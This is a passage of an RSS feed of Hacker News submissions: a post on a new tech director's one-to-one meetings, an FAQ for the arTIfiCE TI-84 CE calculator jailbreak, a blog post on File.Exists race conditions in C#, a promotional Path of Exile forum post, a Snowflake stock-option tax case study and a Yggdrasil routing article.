<p>However, I do not have a very good memory, so for all the subsequent ones I made a few notes after each meeting of key themes. This meant I couldn‚Äôt do more than two in a row or go straight into another meeting, so it made scheduling slightly harder. These days, people are much more aware of the shorter meeting approach so if doing this again, I‚Äôd go for the ‚Äòtherapy hour‚Äô ‚Äì 25 minutes for conversation then 5 minutes for me to make the notes.</p>

<h2 id="introducing-myself">Introducing myself</h2>

<p>In my intro, I gave a potted career history. Starting from my degree in philosophy, and my first career in <a href="https://www.barringtonstoke.co.uk/">children‚Äôs book publishing</a>, through teaching myself to code, my <a href="https://www.hw.ac.uk/study/uk/postgraduate/information-technology-software-systems.htm">masters in Software Systems</a> and then my 15+ year career in programming, infrastructure and operations, technical architecture, and my previous role as <a href="https://www.annashipman.co.uk/jfdi/a-year-in-the-life-os-lead.html">Open Source lead</a>. I also talked about what appealed to me about the job as Technical Director at the FT.</p>

<p>I said roughly the same thing to everyone. I don‚Äôt normally introduce myself and give my background, but in this case I thought that as a new Tech Director most of them would not be working closely with me, and I would not be contributing code, so it was worth giving my credentials.</p>

<p>My mentor had suggested I also say something personal. I think he intended something like ‚Äúmarried with two children‚Äù (or whatever), but instead, I tried to give a different kind of personal detail, something about my interests. I tried to come up with a different one for each conversation, for example something about my <a href="https://twitter.com/annashipman/status/1043917006477643777">cross-stitch hobby</a>.</p>

<p>This part was the hardest part for me, because prior to this I had generally enjoyed keeping a clear boundary between work stuff and personal stuff, so that definitely didn‚Äôt cover talking about cross-stitch, or my home life, on a first meeting. However, I had been trying to bring more of my personal self to work, and this part of the intro did lead to some really interesting conversations and I think helped make a better connection.</p>

<p>Of course, these days, when we are all at home, my personal life is in meetings with me, so it‚Äôs good I‚Äôd already started on that journey!</p>

<p>Giving so much information in my introduction also allowed the other person to introduce themselves how they wanted. Some talked career history, some focused on their hobbies, others were really open about their lives and aspirations.</p>

<h2 id="i-am-so-glad-i-did-this">I am so glad I did this</h2>

<p>My mentor was wrong about one thing ‚Äì&nbsp;none of the conversations were boring.</p>

<p>In my first few months in the new job, I often felt really stretched for time, but I never regretted a single one of these meetings; it was always extremely interesting, my team are brilliant and it was great to meet them one on one, and each conversation always contained some valuable information.</p>

<p>There were two very valuable things about this for me.</p>

<p>The first was getting an idea of what change was needed. These meetings gave me a brilliant insight that wasn‚Äôt available elsewhere. Patterns started emerging very quickly, and formed the basis of our <a href="https://medium.com/ft-product-technology/the-difficult-teenage-years-setting-tech-strategy-after-a-launch-7f42eb94a424">tech strategy</a>.</p>

<p>The second was building relationships. A lot of the people I had 1:1s with I would not have come into contact with during the course of the ordinary working week. It would have taken time to meet everyone at socials, and it wouldn‚Äôt have been the same quality of conversation. I still feel, two years on, that I know a bit about all the people I had those conversations with, which has felt to me like a good foundation for our subsequent conversations.</p>

<p>It was also good, as someone who is a bit shy, to have names to faces quite quickly and people to say hello to when walking round the office.</p>

<h2 id="was-it-useful-for-my-team">Was it useful for my team?</h2>

<p>About a year later, I asked some of the people with whom I‚Äôd had these conversations whether they‚Äôd been useful (in an anonymous form).</p>

<p>All of the people who responded said they found the conversation valuable, and some of their comments were:</p>

<ul>
  <li>‚ÄúIt broke down barriers and helped me feel less intimidated about approaching you, whether to talk about work or just to have a general chit chat. You are a very busy person who I wouldn‚Äôt ever work with directly so it was good to feel that you knew I existed.‚Äù</li>
  <li>‚ÄúThere is hardly any opportunity for me to talk to people in higher position like you except when the team has a big problem. The 1:1 was really casual and I felt really comfortable talking to you. It was a good time to know what kind of person you are. If we didn‚Äôt do the 1:1, the answer of the question below ‚ÄúDo you feel able to raise issues with me?‚Äù would be ‚ÄúNo‚Äù.‚Äù</li>
  <li>‚ÄúWe sat down when you first started and it was nice to get some one-to-one time because it‚Äôs not often you get to do that with a Technical Director. It was nice to raise issues but for me, it was more of an opportunity to understand if I could trust you in the future with raising issues. Raising issues can be difficult and scary so it‚Äôs important to know if the person you are raising them to is receptive.‚Äù</li>
  <li>‚ÄúIt really showed that you cared about us as humans, and how we fit with the rest of the team. It was also a great opportunity to get to know you‚Äù</li>
  <li>‚ÄúI think often of that conversation‚Äù</li>
</ul>

<h2 id="did-it-make-them-feel-more-able-to-raise-issues-with-me">Did it make them feel more able to raise issues with me?</h2>
</div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.annashipman.co.uk/jfdi/meeting-everyone.html">https://www.annashipman.co.uk/jfdi/meeting-everyone.html</a></em></p>]]>
            </description>
            <link>https://www.annashipman.co.uk/jfdi/meeting-everyone.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24512527</guid>
            <pubDate>Fri, 18 Sep 2020 02:59:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[ArTIfiCE is a jailbreak for TI CE calculators]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24512502">thread link</a>) | @bane
<br/>
September 17, 2020 | https://yvantt.github.io/arTIfiCE/ | <a href="https://web.archive.org/web/*/https://yvantt.github.io/arTIfiCE/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="faqDiv">
                                    <p>Great question! A more detailed answer will make its way onto this page later on, but in summary: it gives back to users their legitimate right to enjoy a feature they paid for that TI unilaterally removed in the latest OS versions (allegedly for security reasons, but the bug that cheaters could in theory use was from TI and had nothing to do with ASM!)</p>

                                    <p>Delete the arTIfiCE appvar from the Memory menu (<tt>2nd</tt>+<tt>+</tt>). Depending on what you need to do, you may also want to delete any installed shell and trigger a RAM Reset as well (be sure to archive and/or backup your files first)</p>

                                    <p>Most probably not, considering arTIfiCE only executes a small piece of assembly code (which was previously possible in earlier OSes), and doesn't install anything persistent. Simply fully reset your calc and there will be no trace of it.</p>

                                    <p>arTIfiCE uses software bugs in the calculator's code to be able to execute assembly. A light "shell" is run allowing you to choose which program to launch. The source code may become available later on GitHub.</p>

                                    <p>Most likely, but many other bugs have been found that future versions of arTIfiCE may use :)</p>

                                    <p>No - arTIfiCE only restores functionality TI calculators had for dozens of years and removed in the latest OS. arTIfiCE is in no way a cheating tool, and cheating is not condoned here in any way.</p>

                                    <p>No - arTIfiCE resides in an "appvar" file (Application Variable, an 8xv file) and it will be deleted by the OS when going into Press-To-Test mode, just like most other appvars. You'll have to re-transfer+open it after your exam.</p>

                                    <p>No, or at least not directly: arTIfiCE only makes it possible for you to launch ASM programs, that's it. So you'd have to find a downgrade program for that (search for it on the usual websites).</p>

                                    <p>Sure, from the arTIfiCE shell, you can install another shell, for instance <a href="https://github.com/mateoconlechuga/cesium/releases/latest" target="_blank">Cesium</a>, which can be opened more quickly (thus you get to launch your programs more easily).</p>

                                    <p>Alright... The underlying exploit has a codename. In fact, all the underlying exploits found so far have fun codenames. They'll be released in due time :D</p>
                                </div></div>]]>
            </description>
            <link>https://yvantt.github.io/arTIfiCE/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24512502</guid>
            <pubDate>Fri, 18 Sep 2020 02:55:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The File System is Unpredictable (2009)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24512405">thread link</a>) | @azhenley
<br/>
September 17, 2020 | https://blog.paranoidcoding.com/2009/12/10/the-file-system-is-unpredictable.html | <a href="https://web.archive.org/web/*/https://blog.paranoidcoding.com/2009/12/10/the-file-system-is-unpredictable.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>One of the more frequent questions I answer on StackOverflow is a variation of the following.</p>

<blockquote>
  <p>I‚Äôm doing XXX with a file, how can I know if the file exists?</p>
</blockquote>

<p>The variations include verify no one else has the file open, if the file is in use, the file is not writable, etc ‚Äò. The answer to all of these questions is unfortunately the same. Simply put you can‚Äôt. The reason why is the fundamental nature of the file system prevents such predictive operations.</p>

<p>The file system is a resource with multiple levels of control that is shared between all users and processes in the system. The levels of control include but are not limited to file system and sharing permissions. At <strong>any</strong> point in time any entity on the computer may change a file system object or it‚Äôs controls in any number of ways. For example</p>

<ul>
  <li>The file could be deleted</li>
  <li>A file could be created at place one previously did not exist</li>
  <li>Permissions could change on the file in such a way that the current process does not have access</li>
  <li>Another process could open the file in such a way that is not conducive to sharing</li>
  <li>The user remove the USB key containing the file</li>
  <li>The network connection to the mapped drive could get disconnected</li>
</ul>

<p>Or in short</p>

<blockquote>
  <p>The file system is best viewed as a multi-threaded object over which you have no reliable synchronization capabilities</p>
</blockquote>

<p>Many developers, and APIs for that matter, though treat the file system as though it‚Äôs a static resource and assume what‚Äôs true at one point in time will be true later. Essentially using the result of one operation to predict the success or failure of another. This ignores the possibility of the above actions interweaving in between calls. It leads to code which reads well but executes badly in scenarios where more than one entity is changing the file system.</p>

<p>These problems are best demonstrated by a quick sample. Lets keep it simple and take a stab at a question I‚Äôve seen a few times. The challenge is to write a function which returns all of the text from a file if it exists and an empty string if it does not. To simplify this problem lets assume permissions are not an issue, paths are properly formatted, paths point to local drives and people aren‚Äôt randomly ripping out USB keys. Using the System.IO.File APIs we may construct the following solution.</p>

<div><div><pre><code><span>static</span> <span>string</span> <span>ReadTextOrEmpty</span><span>(</span><span>string</span> <span>path</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>File</span><span>.</span><span>Exists</span><span>(</span><span>path</span><span>))</span> <span>{</span>
        <span>return</span> <span>File</span><span>.</span><span>ReadAllText</span><span>(</span><span>path</span><span>);</span> <span>// Bug!!!</span>
    <span>}</span> <span>else</span> <span>{</span>
        <span>return</span> <span>String</span><span>.</span><span>Empty</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>This code reads great and at a glance looks correct but is actually fundamentally flawed. The reason why is the code changes depends on the call to File.Exist to be true for a large portion of the function. It‚Äôs being used to predict the success of the call to ReadAllText. However there is nothing stopping the file from being deleted in between these two calls. In that case the call to File.ReadAllText would throw a FileNotFoundException which is exactly what the API is trying to prevent!</p>

<p>This code is flawed because it‚Äôs attempting to use one piece of data to make a prediction about the future state of the file system. This is simply not possible with the way the file system is designed. It‚Äôs a shared resource with no reliable synchronization mechanism. File.Exists is much better named as File.ExistedInTheRecentPast (the name gets much worse if you consider the impact of permissions).</p>

<p>Knowing this, how could we write ReadTextOrEmpty in a reliable fashion‚Äô Even though you can not make predictions on the file system the failures of operations is a finite set. So instead of attempting to predict successful conditions for the method, why not just execute the operation and deal with the consequences of failure?</p>

<div><div><pre><code><span>static</span> <span>string</span> <span>ReadTextOrEmpty</span><span>(</span><span>string</span> <span>path</span><span>)</span> <span>{</span>
    <span>try</span> <span>{</span>
        <span>return</span> <span>File</span><span>.</span><span>ReadAllText</span><span>(</span><span>path</span><span>);</span>
    <span>}</span> <span>catch</span> <span>(</span><span>DirectoryNotFoundException</span><span>)</span> <span>{</span>
        <span>return</span> <span>String</span><span>.</span><span>Empty</span><span>;</span>
    <span>}</span> <span>catch</span> <span>(</span><span>FileNotFoundException</span><span>)</span> <span>{</span>
        <span>return</span> <span>String</span><span>.</span><span>Empty</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>This implementation provides the original requested behavior. In the case the file exists, for the duration of the operation, it returns the text of the file and if not returns an empty string.</p>

<p>In general I find the above pattern is the best way to approach the file system. Do the operations you want and deal with the consequences of failure in the form of exceptions. To do anything else involves an unreliable prediction in which you still must handle the resulting exceptions.</p>

<p>If this is the case then why have File.Exist at all if the results can‚Äôt be trusted‚Äô It depends on the level of reliability you want to achieve. In production programs I flag any File.Exist I find as a bug because reliability is a critical component. However you‚Äôll see my personal powershell configuration scripts littered with calls to File.Exsit. Simply put because I‚Äôm a bit lazy in those scripts because critical reliability is not important when I‚Äôm updating my personal .vimrc file.</p>


    </div></div>]]>
            </description>
            <link>https://blog.paranoidcoding.com/2009/12/10/the-file-system-is-unpredictable.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24512405</guid>
            <pubDate>Fri, 18 Sep 2020 02:38:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Path of Exile (Poe) Is a Worth Playing MMO ‚Äì Five Reasons to Explain That]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 6 (<a href="https://news.ycombinator.com/item?id=24512371">thread link</a>) | @ChrisPineson
<br/>
September 17, 2020 | https://www.awow-tech.com/forum/topic/reasons-of-path-of-exile-why-you-really-need-to-play-path-of-exile/ | <a href="https://web.archive.org/web/*/https://www.awow-tech.com/forum/topic/reasons-of-path-of-exile-why-you-really-need-to-play-path-of-exile/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>You need to log in to create posts and topics.</p><div id="postid-1170"><div><div><p><a href="http://www.google.ae/url?q=https://eznpc.com/poe-currency"><img title="" src="https://lh3.googleusercontent.com/YpEB1sT8hT6WU2pqviNhZVrv6z-WZp3Z6jvQnf_j6nkLccp6FsKfkM_CqLaPX1rjOuTZsYJuwQAehpJYYBDm1N-aSyseDP6it2c2QZEibf9VkuK8d9dRWChdbapahCFE8WTwmo89CVw6CGxhBy76bWA9zFNrpcxoSdlLWvFLZZG0kDuQPClDlAGcvYcMj2pZs2we9cpCYY7VgjJo2hLGlltKfNtcYDvxGhkEGJn9zXeUstBfQ7c3Nx-E04j3as71baOyd1W4IrJ1S3UIw82ppje4TXzKmkZDfK2rsHuSMpKayTpt6mQ-MJYtJuwbTpmaDm589Wg03sIu7SttnBMEFSjoesCWSJ6RLTOm0nQzK2lo4np3VlaMU0pdjLYVU0t_uEpLp8iG-R7YSHep-wwCo5MQriXBxdy8N6tILdDT-Lk8xWc239hh9OPc3tMie1cJwk2MNX6QPFQjmeTDy6XDnrmJQOhiYxzx3AV_vmdt1bC0rmeDDdkHu0CLX87B_vLwTGxMYGxGe-bvKkHMGK9YbprrJOkphF-P88nDl5oZnQHwz4HdCuEGh5MsSpK-01JGce3Ghozj1h6aM99t0cAaY2WishVRakVfcfyvYBNSVwoCziSqnmztk-TVa50oQN-npAq3aAdkOvZ-hUqXsmGg8AsMwDaBbWntxJklPwNoA6tSrxCz52GS7EHO96Sp=w657-h329-no?authuser=0" alt="Why You Should Play Path of Exile" width="657" height="328"></a>As we all know the Path of Exile has been available for a very quite long time. Several days ago, they just launched their brand new and Free Delirium Expansion which concentrate on sending players off the grid to carve out a brand new section with passive skill and then encounter the worst nightmares over there and finally let players earn <a href="https://eznpc.com/poe-chaos-orb">PoE orbs</a>&nbsp;and Path of Exile Currency after finish this expansion successfully. Needless to say, a lot of unexpected things are certainly going on in this game. If you are now thinking of turning away from this game just because of the way it looks or the way it feels, then we recommend you to not do it! Cause, in fact, Path of Exile is a quite great ARPG (Action Role-Playing Game) that really deserves the praise and accolades it get from the online gaming community and now, here are five reasons for you to at least consider trying this out!</p>
<p>The very first one is: <strong>This Game Is Free To Play</strong></p>
<p>Who does not like Free Games? Even better, who does not like Free Games that are really excellent? Though Path of Exile offers some optional microtransactions (they have to earn money one way or the other after all), this game is totally free to download and play! Of course, it got off to a quite difficult start when the developer Grinding Gear Game (GGG) launched it firstly, but with tons of expansions, tweaks, and feedback from players, this game has improved drastically and now holds the torch as the best action role-playing video games to date. I have to admit that this game has set the standard that every other game of the same genre should follow!</p>
<p>The second one is: <strong>This Game Has Tons Of Content</strong></p>
<p>Here comes the question, if there's just one thing that Path of Exile is famous for, what would that be? For me, I might answer, that's the vast amount of content PoE has available. This game now has been successfully out for eight years, which means that it's packed full of great content. Though the developer Grinding Gear Games (GGG) has a reputation of sometimes rushing content (the Betrayal League is a great example of that) filled with glaring errors, the fact of the matter is you will be spoiled with so much stuff to do. And you have to admit that most of their expansions are top-notch, and you can sink your teeth into this endgame content easily for hours.</p>
<p>The third one is: <strong>This Game Has Awesome Developer Support</strong></p>
<p>The developer Grinding Gear Games (GGG) of Path of Exile, is always dedicated to continuously improving their game. They are always pushing for updates, from some minor patches every month to some big ones named Leagues. These Leagues give brand new methods to play this game, new loot to discover, and new skin to collect. If that's not enough to entice you into trying out Path of Exile, these Leagues come about 3-4 months! And the developer Grinding Gear Games (GGG) seems to want to ensure that their beloved game lasts forever, therefore, they consistently find unique methods to innovate upon what's have already there. Anyway, there's always something to look forward to!</p>
<p>The fourth one is: <strong>Guide Are Always Available In Path Of Exile</strong></p>
<p>Are you have trouble when choosing which melee equipment you need to use? Or maybe you are a little confused about the skill tree's use? You can find guides all over the Internet pretty easily, and that is mainly thanks to the tight-knit Path of Exile community! Wiki builds are abundant and new guides pop up almost every day. Whether it is a YouTube video to help you with power leveling or just in-depth written guides about all of the expansions, you should know there are plenty of guides to make your Exile in Wraeclast so much easier than before.</p>
<p>The community of Path of Exile is just insanely helpful, particularly to those new starters who are just figuring out this game. It's difficult to find fun games anymore as most are filled with toxicity (checking out League of Legends and DOTA 2). Here people will welcome you with just open arms, and if you are coming from games that are plagued with those toxic communities, then you will be taken aback by how nice everybody is on Path of Exile.</p>
<p>The fifth one is: <strong>This Is A Unique Game</strong></p>
<p>As you know, in most RPGs (Role-Playing Games), you just need to pick a class and the designate skill points to whichever stats you want to increase. Generally, you are just locked into a particular style of play. That is not the case in Path of Exile. Your skills and abilities are just linked to skill gems that are socketed into your very own gear, from your helmet to your boots. And now these gems will apply different abilities to your gear just depending on which you select. Path of Exile pushes players to personalize their own characters with the help of the massive skill tree and hundreds of gems to choose from. No role-playing game has ever implemented this kind of customization yet, making Path of Exile a quite unique experience unlike any other.</p>
<p>And above are our five reasons why you should start playing Path of Exile. Okay now, have we already convinced you to try and farm some rare items such as PoE orbs and <a href="https://eznpc.com/poe-currency">buy PoE currency online</a>&nbsp;for fun? If you are not, just post your comments down below and let us know why.</p>
</div>    </div>
</div><div id="postid-1181"><div><p><img alt="" src="https://secure.gravatar.com/avatar/bae48a4fafec9af9cb0512fbed819bc0?s=120&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/bae48a4fafec9af9cb0512fbed819bc0?s=240&amp;d=mm&amp;r=g 2x" height="120" width="120"></p><div><p><span><a href="https://www.awow-tech.com/forum/profile/dreamzweddingplanner2/">dreamzweddingplanner2</a></span><span>(@dreamzweddingplanner2)</span></p></div><p><small>2 Posts</small></p></div><div><div><p>looking for the Best wedding or an event planner to Organize a wedding or a party in udaipur, delhi, agra, India</p>
<p><a href="https://www.dreamzweddingplanner.com/services/wedding-planning/">Event planner</a></p>
</div>    </div>
</div></div>]]>
            </description>
            <link>https://www.awow-tech.com/forum/topic/reasons-of-path-of-exile-why-you-really-need-to-play-path-of-exile/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24512371</guid>
            <pubDate>Fri, 18 Sep 2020 02:34:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Snowflake case-study in exercising stock options for startup employees]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24512368">thread link</a>) | @yashevde
<br/>
September 17, 2020 | https://www.secfi.com/blog/snowflake-case-study | <a href="https://web.archive.org/web/*/https://www.secfi.com/blog/snowflake-case-study">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>Congrats to all Snowflake employees ü•≥</h2><p>Yesterday was Snowflake's IPO. The first day of trading has ended and shares are now trading $250+.</p><p>Employees who built the company have to be excited. Of course the share price will change before they can sell their shares (there's the usual lock-up period), but it looks like there will be a good outcome. </p><p>Unfortunately, employees who didn't exercise their stock options likely left a lot of money on the table.</p><h2>Extra congrats to those who exercised early on</h2><p>The big decision: when should an employee exercise their stock options? </p><p>It's the million dollar question. It's also difficult to answer as there are lots of implications, and unsurprisingly most end up defaulting to doing nothing. </p><p>Unfortunately, that can be a suboptimal decision. Stock options ‚Äì particularly ISOs ‚Äì can have huge tax benefits if you exercise early. Assuming your company (and 409A) continues to grow, exercising earlier means:</p><ul role="list"><li>Less tax on exercise</li><li>Less tax after IPO</li></ul><p>That's because your taxes at sale get converted to long-term capital gains, which is a lower tax rate. (As long as you meet the holding requirements:&nbsp;sell at least one year after exercising your ISOs, and at least two years after your employer granted them).</p><h2>A case study</h2><p>Let's use rounded/estimated numbers here. Note that this is all just illustrative.</p><p>Employees who started at Snowflake in 2018 likely all have incentive stock options (ISOs) at a &lt;$5 strike price. Say Employee A at Snowflake is granted 5,000 ISOs at $5 strike price.</p><h2>Costs to exercise, initially:&nbsp;$53,405 üò¨</h2><p>Fastforward to mid-2020 and assume the <a href="https://www.secfi.com/what-is/409a-valuation">409A valuation</a> is $30. Employee A would now need to pay $25k to Snowflake for the strike price and ~$28k in taxes for a total of $53k.<br></p><figure id="w-node-e8fbfeecda30-7cbb9235"><p><img src="https://assets.website-files.com/5e8c4317ac31d90b3792a24b/5f634ccc66e6453c03ff3785_EiEXcHdU8AErwKS.png" loading="lazy" alt=""></p><figcaption>Assumptions: CA resident, married filing jointly, $200k base income</figcaption></figure><h2>Costs to exercise, couple weeks ago:&nbsp;$144,514 ü§í</h2><p>If Employee A waited to exercise until the first IPO pricing of $80 a couple weeks ago. Then the tax bill jumps up to ~$119k.</p><figure id="w-node-43d260fd1c16-7cbb9235"><p><img src="https://assets.website-files.com/5e8c4317ac31d90b3792a24b/5f634ced887cf80f7071c557_EiEXqckUcAAVp6_.png" loading="lazy" alt=""></p></figure><h2>Costs to exercise, now:&nbsp;$472,462 ü•µ</h2><p>You probably know what's coming next. If Employee A waited until today to exercise at the $250 public price, then the tax bill goes up to ~$447k.</p><figure id="w-node-146ceabb6f6e-7cbb9235"><p><img src="https://assets.website-files.com/5e8c4317ac31d90b3792a24b/5f634cfcd60f177495cd5d00_EiEXPa2U4AA77Ds.png" loading="lazy" alt=""></p></figure><p>Stock options get more and more expensive to exercise. After an IPO, most will have to resort to doing what's called a cashless exercise which means you buy and sell your shares in same transaction. </p><p>It's cashless because you don't need cash upfront:&nbsp;you can cover the exercise costs with your sale proceeds. Taxwise though, this is the worst scenario. You'll pay ordinary income rates (=high)&nbsp;on ALL gains. </p><h2>Tax savings due to exercising:&nbsp;~$135,000 üí∏</h2><p>So why would anyone volunteer to pay cash to exercise ISOs prior to IPO? </p><p>If you exercise and hold on to your equity for two years after grant and&nbsp;one year after exercise, you sell in a so-called 'qualifying disposition' and convert everything north of your strike to long-term capital gains tax rates (=low). <br></p><p>Let's say Employee A decided to exercise in mid-2020 when the 409A was $30. She pays $53k then waits a year before selling after IPO. If we assume the share price will be $250 when the lock-up period ends in a couple of months, she converts her gain to long-term capital gains and gets an extra ~$135k in her pocket. In other words, she's 20% better off ü•≥ </p><figure id="w-node-40c676eee5e8-7cbb9235"><p><img src="https://assets.website-files.com/5e8c4317ac31d90b3792a24b/5f634d19b903ad5ef89362d8_EiEf0iTVkAEINM3.png" loading="lazy" alt=""></p></figure><p>By the way, that extra ~$135k is with the $53k exercise costs already factored in. So it's all additional profit.</p><h2>Moral of the story: think about exercising early on </h2><p>Don't just wait and see. Each IPO is bittersweet. I'm always happy for the employees, but I also talk to many who realize how much they left on the table. After each IPO, I always hear the same thing: </p><p>"Wish I'd exercised years ago."</p><p>Stock options and taxes are complicated, and startup valuations are uncertain. Most startup employees do not feel well equipped to make these decisions. Investment risk, available cash, personal situations, ability to leave job, etc. all play a factor. Planning ahead allows you to anticipate these risks and avoid (some of) the costs.<br></p><p>So startup employees: Make sure you're being conscious about your stock options. Know the potential risks and benefits from exercising. If you don't know, talk to an advisor or people that do know. There's too much money on the table to ignore.</p><p>Feel free to hit me up for a quick chat in the bottom-right if you've got any questions. ‚ÜòÔ∏è</p><p><em>Additional resources</em></p><ul role="list"><li><em>Calculator used:&nbsp;</em><a href="https://www.secfi.com/products/exercise-tax-calculator"><em>Exercise Tax Calculator</em></a></li><li><a href="https://www.secfi.com/academy/exercise-guide"><em>A comprehensive guide</em></a><em> on how to decide whether to exercise, and how much to spend</em><a href="https://www.secfi.com/products/options-exercise"><em>‚Äç</em></a></li><li><a href="https://www.secfi.com/blog/planning-for-the-ipo"><em>In-depth article</em></a><em> on how to prepare for the IPO,&nbsp;how long-term capital gains works, and how you can calculate potential savings given your personal numbers</em></li><li><em>If your exercise costs are so high they're unaffordable, there's </em><a href="https://www.secfi.com/products/options-exercise"><em>risk-free financing</em></a><br></li></ul></div></div>]]>
            </description>
            <link>https://www.secfi.com/blog/snowflake-case-study</link>
            <guid isPermaLink="false">hacker-news-small-sites-24512368</guid>
            <pubDate>Fri, 18 Sep 2020 02:33:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The World Tree ‚Äì Novel Networking Paradigms (2018)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24512311">thread link</a>) | @dfischer
<br/>
September 17, 2020 | https://yggdrasil-network.github.io/2018/07/17/world-tree.html | <a href="https://web.archive.org/web/*/https://yggdrasil-network.github.io/2018/07/17/world-tree.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <header>
        <a href="https://yggdrasil-network.github.io/">  </a>
        <p>End-to-end encrypted IPv6 networking to connect worlds</p>

        <p>
        <a href="https://yggdrasil-network.github.io/">Home</a><br>
        
          
            
              <a href="https://yggdrasil-network.github.io/about.html">About</a><br>
            
          
        
          
            
              <a href="https://yggdrasil-network.github.io/admin.html">Admin API</a><br>
            
          
        
          
            
              <a href="https://yggdrasil-network.github.io/blog.html">Blog</a><br>
            
          
        
          
            
          
        
          
            
          
        
          
            
              <a href="https://yggdrasil-network.github.io/configuration.html">Configuration</a><br>
            
          
        
          
            
              <a href="https://yggdrasil-network.github.io/faq.html">FAQ</a><br>
            
          
        
          
        
          
            
          
        
          
            
          
        
          
            
          
        
          
            
          
        
          
            
          
        
          
            
          
        
          
            
          
        
          
            
          
        
          
            
          
        
          
            
          
        
          
            
              <a href="https://yggdrasil-network.github.io/installation.html">Installation</a><br>
            
          
        
          
            
          
        
          
            
          
        
          
            
          
        
          
            
          
        
          
            
          
        
          
            
              <a href="https://yggdrasil-network.github.io/platforms.html">Platform Notes</a><br>
            
          
        
          
            
          
        
          
            
          
        
          
        
          
            
              <a href="https://yggdrasil-network.github.io/changelog.html">Changelog</a><br>
            
          
        
          
        
          
        
          
        
        </p>

        <p>
        <a href="https://github.com/yggdrasil-network/yggdrasil-go">GitHub</a><br>
        <a href="https://circleci.com/gh/yggdrasil-network/yggdrasil-go">CircleCI</a><br>
        <a href="https://yggdrasil-network.github.io/builds.html">Latest Builds</a><br>
        <a href="https://github.com/yggdrasil-network/public-peers">Public Peers</a><br>
        <a href="https://yggdrasil-network.github.io/services.html">Public Services</a><br>
        </p>

        <p><a href="https://circleci.com/gh/yggdrasil-network/yggdrasil-go"><img src="https://circleci.com/gh/yggdrasil-network/yggdrasil-go.svg?style=shield&amp;circle-token=:circle-token"></a></p>

        
      </header>
      <section>

      
<small>17 July 2018 by Arceliar
  </small>

<h3 id="taboo-trade-offs">Taboo Trade-offs</h3>

<p>I spent a long time thinking about what to write for my first contribution to this blog.
It makes sense for me to cover the gritty details, to try to explain why and how this thing works under the hood, but there‚Äôs a lot to go over.
Still, we have to start somewhere, and this seems as good a place as any.</p>

<p>There are things we ideally want a network to do.
We want to find the shortest path between any two nodes in a network.
We want to use as little resources as possible.
We want latency to be as low as possible.
We want as much bandwidth as possible.
We want to minimize packet loss.
We want the network to be fault tolerant, and re-converge as quickly as possible if/when disruptions do occur.
We want security.
We want simplicity.
The list goes on.</p>

<p>Unfortunately, some of these things involve fundamental trade-offs.
Mathematicians have proven, from a pretty inescapable information theory argument, that there‚Äôs a trade-off between memory and the efficiency of the paths you can find:
If you want to guarantee memory usage below <code>~O(n^(1/k))</code>, you must accept stretch as high as <code>2k-1</code>.
Similarly, if you want more bandwidth, they you must sometimes use higher-latency paths, and both can get in the way of reliability / low packet loss.</p>

<p>Yggdrasil is an experimental implementation of a number of different ideas.
In this blog post, and likely my next several, I‚Äôll try to go over some of them, but at the end of the day, it‚Äôs all about trade-offs.
When seeking to improve performance in one area, we must sometimes make sacrifices in another.
Today‚Äôs blog post focuses on Yggdrasil‚Äôs routing logic.
On realistic network topologies, we achieve polylogarithmic memory scaling by sacrificing something held sacred in most other routing schemes: shortest path routing.
To explain how and why, I think it‚Äôs best if we first review how things are done elsewhere.</p>

<h3 id="hard-cidr">Hard CIDR</h3>

<p>Networks today are built around hierarchically allocated addressing and <a href="https://en.wikipedia.org/wiki/Classless_Inter-Domain_Routing">classless inter-domain routing</a> (CIDR).
The basic idea is to allocate addresses in a network from a contiguous address range, often as small as a <code>/64</code> for IPv6 addresses (a block of addresses with the first 64 bits in common, e.g. <code>1111:2222:3333:4444::/64</code> denotes all addresses from <code>1111:2222:3333:4444:0000:0000:0000:0000</code> to <code>1111:2222:3333:4444:ffff:ffff:ffff:ffff</code>).</p>

<p>A gateway node <code>G</code> in network <code>A</code>, with a connection to another network <code>B</code>, can advertise to network <code>A</code> a route to the address range of network <code>B</code>, and vice versa.
This allows nodes in network <code>A</code> and <code>B</code> to communicate with each other by routing through gateway node <code>G</code>.
This system of gateways, often between a hierarchy of networks with progressively smaller address ranges, is meant to keep routing tables small.</p>

<p>Within a particular network, each node must be able to find a path to every other node within that network.
Virtually all routing schemes in use today are a form of shortest path routing, wherein each node knows the shortest path to every other node in the network, for some definition of path length (such as the number of network hops, latency, some function of bandwidth usage, or often the <a href="https://en.wikipedia.org/wiki/Expected_transmission_count">expected transmission count</a> in mesh networks).
A notable exception to this is Ethernet, which has historically used the <a href="https://en.wikipedia.org/wiki/Spanning_Tree_Protocol">spanning-tree protocol</a> (STP) to reduce a network to a tree topology, in an effort to eliminate routing loops, but newer protocols (such as <a href="https://en.wikipedia.org/wiki/IEEE_802.1aq">shortest path bridging</a>) aim to improve this.
